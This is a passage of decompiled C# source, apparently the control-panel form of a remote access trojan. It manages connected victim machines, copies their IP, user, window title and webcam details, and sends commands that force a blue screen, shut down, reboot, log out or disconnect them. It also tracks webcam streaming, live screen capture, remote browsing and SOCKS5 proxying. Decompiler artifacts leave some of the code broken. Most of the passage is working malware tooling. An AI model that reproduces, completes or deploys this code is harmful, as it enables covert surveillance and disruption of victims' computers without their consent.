				this.struct18_4.method_1(true);
			}
		}
	}

	// Token: 0x060013A5 RID: 5029 RVA: 0x0009D2B4 File Offset: 0x0009B4B4
	public void method_66()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate130(this.method_66), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_18().RefreshObjects(this.concurrentStack_1.ToList<CClient>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x060013A6 RID: 5030 RVA: 0x0009D31C File Offset: 0x0009B51C
	public void method_67(int int_1)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fMain.Delegate142(this.method_67), new object[]
			{
				int_1
			});
			return;
		}
		base.Opacity = Conversion.Val((double)this.struct16_1.method_0() / 100.0);
	}

	// Token: 0x060013A7 RID: 5031 RVA: 0x0009D37C File Offset: 0x0009B57C
	private void method_68(object sender, DoWorkEventArgs e)
	{
		this.struct16_1.method_1(0);
		while (this.struct16_1.method_0() < 100)
		{
			ref int ptr = ref this.struct16_1;
			this.struct16_1.method_1(checked(ptr.method_0() + 5));
			int num = this.struct16_1.method_0();
			if (base.InvokeRequired)
			{
				base.Invoke(new fMain.Delegate142(this.method_67), new object[]
				{
					num
				});
			}
			else
			{
				base.Opacity = Conversion.Val((double)this.struct16_1.method_0() / 100.0);
			}
			Thread.Sleep(1);
		}
	}

	// Token: 0x060013A8 RID: 5032 RVA: 0x0009D424 File Offset: 0x0009B624
	public void method_69()
	{
		checked
		{
			if (this.vmethod_18().SelectedObjects.Count > 0)
			{
				CClient cclient3;
				CClient cclient2;
				CClient cclient = cclient2 = (cclient3 = (CClient)this.vmethod_18().SelectedObjects[0]);
				bool flag;
				Form form2;
				Rectangle rectangle;
				int x;
				int y;
				if (cclient2.fDB == null)
				{
					cclient2.fDB = new fDashboard();
					cclient2.fDB.method_1(ref cclient2.sock_async, ref cclient2.sIP, ref cclient2.sPort, ref cclient2.sLANIP, ref cclient2.sUser, ref cclient2.sSettingPassword);
					cclient2.fDB.Show();
					Form fDB = cclient2.fDB;
					Form fMain_ = Class130.fMain_0;
					flag = false;
					Form form = fMain_;
					form2 = fDB;
					CClient cclient4 = cclient;
					if (form != null)
					{
						rectangle = form.RectangleToScreen(form.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form2.Location).WorkingArea;
					}
					x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
					y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
					form2.Location = new Point(x, y);
					if (flag)
					{
						form2.Visible = true;
					}
					cclient3 = cclient4;
				}
				else if (!cclient2.fDB.Visible)
				{
					cclient2.fDB.method_147();
					Form fDB2 = cclient2.fDB;
					Form fMain_2 = Class130.fMain_0;
					flag = false;
					Form form = fMain_2;
					form2 = fDB2;
					CClient cclient5 = cclient;
					if (form != null)
					{
						rectangle = form.RectangleToScreen(form.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form2.Location).WorkingArea;
					}
					x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
					y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
					form2.Location = new Point(x, y);
					if (flag)
					{
						form2.Visible = true;
					}
					cclient3 = cclient5;
				}
				CClient cclient6 = cclient3;
				cclient6.fDB.Activate();
				Form fDB3 = cclient6.fDB;
				flag = false;
				form2 = fDB3;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form2.Location).WorkingArea;
				}
				x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
				y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
				form2.Location = new Point(x, y);
				if (flag)
				{
					form2.Visible = true;
				}
			}
		}
	}

	// Token: 0x060013A9 RID: 5033 RVA: 0x0000AA51 File Offset: 0x00008C51
	private void method_70(object sender, EventArgs e)
	{
		this.method_69();
	}

	// Token: 0x060013AA RID: 5034 RVA: 0x0009D660 File Offset: 0x0009B860
	private void method_71(object sender, FormatCellEventArgs e)
	{
		try
		{
			CClient cclient = (CClient)e.Model;
			if (cclient.lSpeedBytesIn > 131072L | cclient.lSpeedBytesOut > 131072L)
			{
				e.Item.SubItems[10].ForeColor = Color.Blue;
			}
			if (e.Column.IsVisible)
			{
				if (cclient.lPing <= 500L)
				{
					e.Item.SubItems[15].ForeColor = Color.LimeGreen;
				}
				if (cclient.lPing > 500L & cclient.lPing <= 1000L)
				{
					e.Item.SubItems[15].ForeColor = Color.Blue;
				}
				if (cclient.lPing > 1000L)
				{
					e.Item.SubItems[15].ForeColor = Color.Red;
				}
			}
			if (cclient.lCPUusage <= 10L)
			{
				e.Item.SubItems[11].ForeColor = Color.Black;
			}
			if (cclient.lCPUusage > 10L & cclient.lCPUusage <= 50L)
			{
				e.Item.SubItems[11].ForeColor = Color.Blue;
			}
			if (cclient.lCPUusage > 50L)
			{
				e.Item.SubItems[11].ForeColor = Color.Red;
			}
			if (!cclient.IS_SSL)
			{
				e.Item.SubItems[1].ForeColor = Color.Blue;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060013AB RID: 5035 RVA: 0x0009D858 File Offset: 0x0009BA58
	private void method_72(object sender, DrawListViewSubItemEventArgs e)
	{
		checked
		{
			if (e.Item.SubItems[1] == e.SubItem)
			{
				e.DrawDefault = false;
				object graphics = e.Graphics;
				Type type = null;
				string memberName = "DrawImage";
				object[] array = new object[5];
				int num = 0;
				ImageList.ImageCollection images;
				object instance = images = Class130.imageList_0.Images;
				Type type2 = null;
				string memberName2 = "Item";
				object[] array2 = new object[1];
				ListViewItem item;
				object obj = array2[0] = (item = e.Item).Tag;
				object[] array3 = array2;
				bool[] array4;
				object obj2 = NewLateBinding.LateGet(instance, type2, memberName2, array2, null, null, array4 = new bool[]
				{
					true
				});
				if (array4[0])
				{
					item.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3[0]));
				}
				array[num] = obj2;
				int num2 = 1;
				Rectangle bounds;
				Rectangle rectangle = bounds = e.Bounds;
				array[num2] = bounds.X;
				array[2] = e.Bounds.Y + 5;
				int num3 = 3;
				Rectangle rectangle2 = bounds = e.Bounds;
				array[num3] = bounds.Height;
				array[4] = 16;
				object[] array5 = array;
				bool[] array6;
				NewLateBinding.LateCall(graphics, type, memberName, array, null, null, array6 = new bool[]
				{
					true,
					true,
					false,
					true,
					false
				}, true);
				if (array6[0])
				{
					NewLateBinding.LateSetComplex(images, null, "Item", new object[]
					{
						obj,
						array5[0]
					}, null, null, true, true);
				}
				if (array6[1])
				{
					rectangle.X = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[1]), typeof(int));
				}
				if (array6[3])
				{
					rectangle2.Height = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[3]), typeof(int));
				}
				Rectangle r = new Rectangle(e.Bounds.X + e.Bounds.Height, e.Bounds.Y, e.Bounds.Width - e.Bounds.Height, e.Bounds.Height);
				e.Graphics.DrawString(e.SubItem.Text, e.SubItem.Font, new SolidBrush(e.SubItem.ForeColor), r, new StringFormat
				{
					Alignment = StringAlignment.Near,
					LineAlignment = StringAlignment.Center,
					FormatFlags = StringFormatFlags.NoWrap,
					Trimming = StringTrimming.EllipsisCharacter
				});
				return;
			}
			e.DrawDefault = true;
		}
	}

	// Token: 0x060013AC RID: 5036 RVA: 0x0000AA59 File Offset: 0x00008C59
	private void method_73(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_65();
			Thread.Sleep(3000);
		}
	}

	// Token: 0x060013AD RID: 5037 RVA: 0x0000AA6C File Offset: 0x00008C6C
	private void method_74(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_66();
			Thread.Sleep(5000);
		}
	}

	// Token: 0x060013AE RID: 5038 RVA: 0x0009DAA8 File Offset: 0x0009BCA8
	private void method_75(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_18();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				CClient cclient = (CClient)obj;
				stringBuilder.Append(string.Concat(new string[]
				{
					cclient.sIP,
					"\t",
					cclient.sLANIP,
					"\t",
					cclient.sUser,
					"\t",
					cclient.sOperatingSystem,
					"\t",
					cclient.sWindowTitle,
					"\t",
					cclient.sIdle,
					"\t",
					cclient.sBandwidthDL,
					"\t",
					cclient.sInOut,
					"\t",
					cclient.sSpeed,
					"\t",
					cclient.sCPUusage,
					"\t",
					cclient.sCam,
					"\t",
					cclient.sCountry,
					"\t",
					cclient.sPing,
					"\r\n"
				}));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x060013AF RID: 5039 RVA: 0x0009DC48 File Offset: 0x0009BE48
	private void method_76(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					stringBuilder.Append(string.Concat(new string[]
					{
						cclient.sIP,
						"\t",
						cclient.sLANIP,
						"\t",
						cclient.sUser,
						"\t",
						cclient.sOperatingSystem,
						"\t",
						cclient.sWindowTitle,
						"\t",
						cclient.sIdle,
						"\t",
						cclient.sBandwidthDL,
						"\t",
						cclient.sInOut,
						"\t",
						cclient.sSpeed,
						"\t",
						cclient.sCPUusage,
						"\t",
						cclient.sCam,
						"\t",
						cclient.sCountry,
						"\t",
						cclient.sPing,
						"\r\n"
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		if (stringBuilder.Length > 0)
		{
			string text = stringBuilder.ToString();
			Clipboard.Clear();
			Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
		}
	}

	// Token: 0x060013B0 RID: 5040 RVA: 0x0009DDFC File Offset: 0x0009BFFC
	public void method_77()
	{
		if (Class130.fSocks5_0.vmethod_20().InvokeRequired)
		{
			Class130.fSocks5_0.vmethod_20().Invoke(new fMain.Delegate136(this.method_77), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fSocks5_0.Visible = true;
				Class130.fSocks5_0.Activate();
				Form fSocks5_ = Class130.fSocks5_0;
				bool flag = false;
				Form form = fSocks5_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fSocks5_0.Opacity = 100.0;
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060013B1 RID: 5041 RVA: 0x0000AA7F File Offset: 0x00008C7F
	private void method_78(object sender, EventArgs e)
	{
		this.method_77();
	}

	// Token: 0x060013B2 RID: 5042 RVA: 0x0009DF00 File Offset: 0x0009C100
	private void method_79(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Reconnect selected clients?", "Reconnect the selected client?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_rc|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
						CClient cclient2 = cclient;
						bool flag = true;
						cclient2.SOCKET_DISCONNECT(ref flag);
						this.concurrentStack_1.Push(cclient);
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B3 RID: 5043 RVA: 0x0009E070 File Offset: 0x0009C270
	private void method_80(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Disconnect selected clients?\r\n\r\nNote: Disconnection is performed by means of process termination.", "Disconnect the selected client?\r\n\r\nNote: Disconnection is performed by means of process termination.")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_dc|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
						this.concurrentStack_1.Push(cclient);
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B4 RID: 5044 RVA: 0x0009E1D4 File Offset: 0x0009C3D4
	private void method_81(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Put selected clients operating system to sleep?\r\n\r\nNote: Clients will reconnect once systems are powered back on.", "Put the selected client's operating system to sleep?\r\n\r\nNote: The client will reconnect once the system is powered back on.")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_sleep|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B5 RID: 5045 RVA: 0x0009E32C File Offset: 0x0009C52C
	private void method_82(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Hibernate selected clients operating system?\r\n\r\nNote: Clients will reconnect once systems are powered back on.", "Hibernate selected client's operating system?\r\n\r\nNote: The client will reconnect once the system is powered back on.")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_hib|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B6 RID: 5046 RVA: 0x0009E484 File Offset: 0x0009C684
	private void method_83(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Log selected clients out from their operating system?", "Log selected client out from the operating system?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_log|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B7 RID: 5047 RVA: 0x0009E5DC File Offset: 0x0009C7DC
	private void method_84(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Reboot selected clients operating systems?", "Reboot selected client's operating system?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_rs|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B8 RID: 5048 RVA: 0x0009E734 File Offset: 0x0009C934
	private void method_85(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Shutdown selected clients operating systems?", "Shutdown selected client's operating system?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_off|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013B9 RID: 5049 RVA: 0x0009E88C File Offset: 0x0009CA8C
	private void method_86(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_18();
		if (fastObjectListView.SelectedObjects.Count > 0 && MessageBox.Show(Conversions.ToString(Interaction.IIf(fastObjectListView.SelectedObjects.Count > 1, "Force BSOD on selected clients?", "Force BSOD on the selected client?")), Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					try
					{
						string sKey = cclient.sKey;
						string string_ = "cli_bsod|1";
						string string_2 = sKey;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						cclient.pending_dc = true;
						cclient.bJustConnected = false;
						cclient.pending_dc_timeout = false;
					}
					catch (Exception ex2)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060013BA RID: 5050 RVA: 0x0009E9E4 File Offset: 0x0009CBE4
	private void method_87(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			Thread.Sleep(1);
			try
			{
				if (Class130.concurrentDictionary_3.Count == 0)
				{
					Thread.Sleep(100);
				}
				else
				{
					Class130.long_1 = 0L;
					ConcurrentStack<CClient> concurrentStack = new ConcurrentStack<CClient>();
					try
					{
						foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
						{
							if (!keyValuePair.Value.FILE_TRANSFER_ACTIVE & !keyValuePair.Value.SCREENLIVE_ACTIVE & !keyValuePair.Value.SCREENLIVE_SECONDARY_ACTIVE & !keyValuePair.Value.SCREEN_PREVIEW_ACTIVE & !keyValuePair.Value.WEBCAM_PREVIEW_ACTIVE & !keyValuePair.Value.WEBCAMSTREAM_ACTIVE & !keyValuePair.Value.REMOTE_BROWSER_ACTIVE & !keyValuePair.Value.SOCKET_COMMAND_ACTIVE)
							{
								Class136.Struct27 @struct = default(Class136.Struct27);
								@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
								bool flag = false;
								if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
								{
									flag = true;
								}
								long num;
								if (flag)
								{
									num = Class136.GetTickCount64();
								}
								else
								{
									num = (long)Class136.GetTickCount();
								}
								long num2 = num;
								checked
								{
									if (num2 - keyValuePair.Value.lLastSignal >= 35000L)
									{
										concurrentStack.Push(Class130.concurrentDictionary_3[keyValuePair.Value.sKey]);
									}
									else if (num2 - keyValuePair.Value.lLastSignal >= 30000L & num2 - keyValuePair.Value.lLastSignal < 35000L)
									{
										keyValuePair.Value.pending_dc_timeout = false;
										keyValuePair.Value.pending_dc = true;
										this.concurrentStack_1.Push(keyValuePair.Value);
									}
									else if (num2 - keyValuePair.Value.lLastSignal > 20000L & num2 - keyValuePair.Value.lLastSignal < 30000L)
									{
										if (!keyValuePair.Value.pending_dc)
										{
											keyValuePair.Value.pending_dc = true;
											keyValuePair.Value.pending_dc_timeout = true;
											this.concurrentStack_1.Push(keyValuePair.Value);
										}
									}
									else if (!keyValuePair.Value.pending_dc)
									{
										keyValuePair.Value.pending_dc_timeout = false;
										keyValuePair.Value.pending_dc = false;
										this.concurrentStack_1.Push(keyValuePair.Value);
										Class130.long_1 += 1L;
									}
									if (keyValuePair.Value.lLastSpeedUpdate > 0L)
									{
										CClient value = keyValuePair.Value;
										string[] array = new string[5];
										array[0] = "D: ";
										int num3 = 1;
										unchecked
										{
											double num4 = keyValuePair.Value.stats_bytes_in - keyValuePair.Value.stats_last_bytes_in;
											bool flag2 = false;
											ref bool ptr = ref flag2;
											double num5 = num4;
											int num6 = num3;
											string[] array2 = array;
											string[] array3 = array;
											CClient cclient = value;
											int num7;
											string text2;
											int num8;
											object obj;
											try
											{
												ProjectData.ClearProjectError();
												num7 = 2;
												string text = string.Empty;
												if (num5 >= 1099511627776.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num5 >= 1073741824.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num5 >= 1048576.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num5 >= 1024.0)
												{
													text = Strings.Format(num5 / 1024.0, "#0.00") + " KiB";
												}
												else if (num5 < 1024.0)
												{
													text = Conversions.ToString(Conversion.Fix(num5)) + " B";
												}
												if (ptr)
												{
													text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
												}
												if (text.Length > 0)
												{
													text2 = text;
												}
												else
												{
													text2 = " 0 B";
												}
												IL_453:
												goto IL_49B;
												IL_455:
												text2 = "0 B";
												goto IL_453;
												IL_45E:
												num8 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num7);
												IL_474:
												goto IL_83D;
											}
											catch when (endfilter(obj is Exception & num7 != 0 & num8 == 0))
											{
												Exception ex = (Exception)obj2;
												goto IL_45E;
											}
											goto IL_49B;
											IL_83D:
											throw ProjectData.CreateProjectError(-2146828237);
											IL_49B:
											if (num8 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string text3 = text2;
											CClient cclient2 = cclient;
											string[] array4 = array3;
											array2[num6] = text3;
											array4[2] = "/s, U: ";
											int num9 = 3;
											double num10 = keyValuePair.Value.stats_bytes_out - keyValuePair.Value.stats_last_bytes_out;
											flag2 = false;
											ptr = ref flag2;
											num5 = num10;
											int num11 = num9;
											string[] array5 = array4;
											string[] array6 = array4;
											CClient cclient3 = cclient2;
											object obj3;
											try
											{
												ProjectData.ClearProjectError();
												num7 = 2;
												string text = string.Empty;
												if (num5 >= 1099511627776.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num5 >= 1073741824.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num5 >= 1048576.0)
												{
													text = Strings.Format(num5 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num5 >= 1024.0)
												{
													text = Strings.Format(num5 / 1024.0, "#0.00") + " KiB";
												}
												else if (num5 < 1024.0)
												{
													text = Conversions.ToString(Conversion.Fix(num5)) + " B";
												}
												if (ptr)
												{
													text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
												}
												if (text.Length > 0)
												{
													text2 = text;
												}
												else
												{
													text2 = " 0 B";
												}
												IL_663:
												goto IL_6AB;
												IL_665:
												text2 = "0 B";
												goto IL_663;
												IL_66E:
												num8 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num7);
												IL_684:
												goto IL_848;
											}
											catch when (endfilter(obj3 is Exception & num7 != 0 & num8 == 0))
											{
												Exception ex2 = (Exception)obj4;
												goto IL_66E;
											}
											IL_6AB:
											if (num8 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string text4 = text2;
											CClient cclient4 = cclient3;
											string[] array7 = array6;
											array5[num11] = text4;
											array7[4] = "/s";
											cclient4.sSpeed = string.Concat(array7);
										}
										keyValuePair.Value.lSpeedBytesIn = (long)Math.Round(unchecked(keyValuePair.Value.stats_bytes_in - keyValuePair.Value.stats_last_bytes_in));
										keyValuePair.Value.lSpeedBytesOut = (long)Math.Round(unchecked(keyValuePair.Value.stats_bytes_out - keyValuePair.Value.stats_last_bytes_out));
										goto IL_72B;
										IL_848:
										throw ProjectData.CreateProjectError(-2146828237);
									}
									IL_72B:
									keyValuePair.Value.stats_last_bytes_in = keyValuePair.Value.stats_bytes_in;
									keyValuePair.Value.stats_last_bytes_out = keyValuePair.Value.stats_bytes_out;
									keyValuePair.Value.lLastSpeedUpdate = num2;
									string key = keyValuePair.Key;
									this.method_14(ref key, ref keyValuePair.Value.pending_dc, ref keyValuePair.Value.pending_dc_timeout);
									key = keyValuePair.Key;
									this.method_15(ref key, ref keyValuePair.Value.pending_dc, ref keyValuePair.Value.pending_dc_timeout);
									key = keyValuePair.Key;
									this.method_16(ref key, ref keyValuePair.Value.pending_dc, ref keyValuePair.Value.pending_dc_timeout);
									key = keyValuePair.Key;
									this.method_17(ref key, ref keyValuePair.Value.pending_dc, ref keyValuePair.Value.pending_dc_timeout);
									key = keyValuePair.Key;
									this.method_18(ref key, ref keyValuePair.Value.pending_dc, ref keyValuePair.Value.pending_dc_timeout);
								}
							}
						}
					}
					finally
					{
